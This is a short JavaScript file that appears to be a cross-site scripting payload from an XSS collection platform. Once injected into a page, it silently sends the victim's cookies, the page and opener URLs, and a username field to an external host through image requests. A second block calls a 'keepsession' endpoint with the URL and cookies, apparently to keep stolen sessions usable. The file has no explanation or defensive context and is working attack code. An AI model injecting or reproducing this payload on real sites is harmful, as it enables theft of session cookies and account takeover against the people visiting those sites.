(function() {
	(new Image()).src = 'http://xsserme.sinaapp.com/index.php?do=api&id=105eXB&location=' + escape((function() {
		try {
			return document.location.href
		} catch (e) {
			return ''
		}
	})()) + '&toplocation=' + escape((function() {
		try {
			return top.location.href
		} catch (e) {
			return ''
		}
	})()) + '&cookie=' + escape((function() {
		try {
			return document.cookie
		} catch (e) {
			return ''
		}
	})()) + '&opener=' + escape((function() {
		try {
			return (window.opener && window.opener.location.href) ? window.opener.location.href : ''
		} catch (e) {
			return ''
		}
	})()) + '&username=' + escape((function() {
		try {
			return PageData.user_name
		} catch (e) {
			return ''
		}
	})());
})();
if ('1' == 1) {
	keep = new Image();
	keep.src = 'http://xsserme.sinaapp.com/index.php?do=keepsession&id=105eXB&url=' + escape(document.location) + '&cookie=' + escape(document.cookie)
};